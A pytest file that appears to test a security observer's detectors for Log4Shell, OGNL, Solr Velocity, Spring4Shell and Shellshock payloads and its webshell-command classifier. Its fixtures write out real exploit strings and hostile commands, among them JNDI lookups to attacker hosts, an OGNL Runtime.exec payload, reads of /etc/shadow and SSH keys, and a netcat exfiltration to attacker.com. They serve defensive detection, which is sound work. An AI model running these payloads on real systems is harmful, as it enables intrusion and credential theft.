"""Tests de las heuristicas de triaje del observador.

Valida que los patrones de CVE modernos (Log4Shell, Struts OGNL, Confluence OGNL,
Solr Velocity, Spring4Shell) se detecten correctamente sin falsos positivos
en trafico benigno.
"""

import pytest

from src.agents.observer.nodes import (
    _LOG4SHELL_RE,
    _OGNL_CONFLUENCE_RE,
    _OGNL_RE,
    _SHELLSHOCK_RE,
    _SOLR_VELOCITY_RE,
    _SPRING4SHELL_RE,
    _build_ip_profiles,
    classify_webshell_cmd,
    extract_webshell_cmd,
)


def _apache(ip: str, method: str, path: str, status: int, ua: str = "curl/8.19.0") -> dict:
    """Helper: log entry en formato Apache combined."""
    return {
        "labels": {"container_name": "target"},
        "message": (
            f'{ip} - - [26/Apr/2026:02:46:24 +0000] '
            f'"{method} {path} HTTP/1.1" {status} 1234 "-" "{ua}"'
        ),
    }


class TestLog4ShellDetection:
    def test_basic_jndi_ldap(self):
        assert _LOG4SHELL_RE.search("${jndi:ldap://attacker.com/exploit}")

    def test_jndi_rmi(self):
        assert _LOG4SHELL_RE.search("${jndi:rmi://evil/payload}")

    def test_jndi_dns(self):
        assert _LOG4SHELL_RE.search("${jndi:dns://oob.example.com}")

    def test_obfuscated_lower(self):
        """Variante con ${lower:j}${lower:n}... que evade filtros simples."""
        payload = "${lower:j}ndi:ldap://x/y"
        assert _LOG4SHELL_RE.search(payload)

    def test_in_user_agent(self):
        ua = "Mozilla/5.0 ${jndi:ldap://attacker/a}"
        assert _LOG4SHELL_RE.search(ua)

    def test_no_false_positive_on_normal_traffic(self):
        normal = "GET /api/user?id=123 HTTP/1.1"
        assert not _LOG4SHELL_RE.search(normal)

    def test_no_false_positive_on_template_literal(self):
        """`${variable}` en codigo legitimo NO es log4shell."""
        assert not _LOG4SHELL_RE.search("${user.name}")
        assert not _LOG4SHELL_RE.search("Hello ${name}")


class TestOGNLDetection:
    def test_struts2_runtime_exec(self):
        """CVE-2017-5638 payload en Content-Type."""
        payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('id'))}"
        assert _OGNL_RE.search(payload)

    def test_struts2_process_builder(self):
        payload = "%{(#a=new ProcessBuilder('id').start()).(#a.getInputStream())}"
        assert _OGNL_RE.search(payload)

    def test_confluence_ognl(self):
        """CVE-2022-26134 payload en URI."""
        payload = "/${@java.lang.Runtime@getRuntime().exec('id')}/"
        assert _OGNL_CONFLUENCE_RE.search(payload)

    def test_no_false_positive_curly_braces(self):
        """JSON payloads con {} NO son OGNL."""
        assert not _OGNL_RE.search('{"id": 123}')
        assert not _OGNL_CONFLUENCE_RE.search('{"name": "test"}')


class TestSolrVelocity:
    def test_resource_loader_enabled(self):
        """CVE-2019-17558: payload estandar."""
        payload = "params.resource.loader.enabled=true"
        assert _SOLR_VELOCITY_RE.search(payload)

    def test_velocity_response_writer(self):
        payload = "wt=velocity&v.template=custom&VelocityResponseWriter"
        assert _SOLR_VELOCITY_RE.search(payload)


class TestSpring4Shell:
    def test_class_module_classloader(self):
        """CVE-2022-22965."""
        payload = "class.module.classLoader.resources.context.parent.pipeline"
        assert _SPRING4SHELL_RE.search(payload)

    def test_class_get_resource(self):
        assert _SPRING4SHELL_RE.search("class.getResource('/evil')")


class TestShellshock:
    def test_basic_payload(self):
        assert _SHELLSHOCK_RE.search("() { :; };")

    def test_alt_variant(self):
        assert _SHELLSHOCK_RE.search("() { _; };")


class TestExtractWebshellCmd:
    def test_unencoded(self):
        url = "http://target/shell.php?cmd=id"
        assert extract_webshell_cmd(url) == "id"

    def test_url_encoded(self):
        """Bug del audit: cmd%3D no extraia."""
        url = "http://target/shell.php?cmd%3Did"
        assert extract_webshell_cmd(url) == "id"

    def test_url_encoded_value(self):
        url = "http://target/shell.php?cmd=cat%20%2Fetc%2Fpasswd"
        assert extract_webshell_cmd(url) == "cat /etc/passwd"

    def test_no_cmd_param(self):
        assert extract_webshell_cmd("http://target/index.php") is None


class TestClassifyWebshellCmd:
    def test_privilege_escalation(self):
        cmd = "python3 -c 'import os; os.setuid(0); os.system(\"cat /root/flag\")'"
        tactic, tid = classify_webshell_cmd(cmd)
        assert tactic == "Privilege Escalation"
        assert tid == "TA0004"

    def test_credential_access_shadow(self):
        tactic, tid = classify_webshell_cmd("cat /etc/shadow")
        assert tactic == "Credential Access"
        assert tid == "TA0006"

    def test_credential_access_ssh_key(self):
        tactic, _ = classify_webshell_cmd("cat /home/user/.ssh/id_rsa")
        assert tactic == "Credential Access"

    def test_discovery_uname(self):
        tactic, tid = classify_webshell_cmd("uname -a")
        assert tactic == "Discovery"
        assert tid == "TA0007"

    def test_discovery_id(self):
        tactic, _ = classify_webshell_cmd("id")
        assert tactic == "Discovery"

    def test_default_execution(self):
        """Comando raro que no matchea ningun patron → Execution."""
        tactic, tid = classify_webshell_cmd("unknown_random_tool --flag value")
        assert tactic == "Execution"
        assert tid == "TA0002"

    def test_exfiltration_nc(self):
        tactic, _ = classify_webshell_cmd("nc attacker.com 4444 < secret.txt")
        assert tactic == "Exfiltration"


class TestLoginSuccessGeneralized:
    """Detect login_success en DVWA, WordPress, paneles admin genericos."""

    def test_dvwa_login_post_302_marks_success(self):
        logs = [_apache("10.10.0.5", "POST", "/login.php", 302)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1

    def test_wordpress_login_post_302_marks_success(self):
        logs = [_apache("10.10.0.5", "POST", "/wp-login.php", 302)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1

    def test_dvwa_login_post_200_marks_failed(self):
        logs = [_apache("10.10.0.5", "POST", "/login.php", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_failed"] == 1
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 0

    def test_signin_path_post_302(self):
        logs = [_apache("10.10.0.5", "POST", "/signin", 302)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1

    def test_get_login_does_not_mark_login(self):
        logs = [_apache("10.10.0.5", "GET", "/login.php", 302)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["login_success"] == 0
        assert prof["login_failed"] == 0


class TestWebshellExecGeneralized:
    """Detect execution via cmd= URL (clasica) y POST a endpoints exec (DVWA)."""

    def test_dvwa_exec_post_200_marks_execution(self):
        logs = [_apache("10.10.0.5", "POST", "/vulnerabilities/exec/", 200)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["webshell_execution"] == 1
        assert "Execution" in prof["webshell_sub_tactics"]

    def test_classic_cmd_url_get_200_marks_execution(self):
        logs = [_apache("10.10.0.5", "GET", "/shell.php?cmd=id", 200)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["webshell_execution"] == 1
        assert "Discovery" in prof["webshell_sub_tactics"]

    def test_dvwa_exec_get_404_does_not_mark(self):
        logs = [_apache("10.10.0.5", "GET", "/vulnerabilities/exec/", 404)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["webshell_execution"] == 0

    def test_dvwa_upload_post_200_marks_execution(self):
        logs = [_apache("10.10.0.5", "POST", "/vulnerabilities/upload/", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 1

    def test_post_to_random_endpoint_does_not_mark(self):
        logs = [_apache("10.10.0.5", "POST", "/api/users", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 0
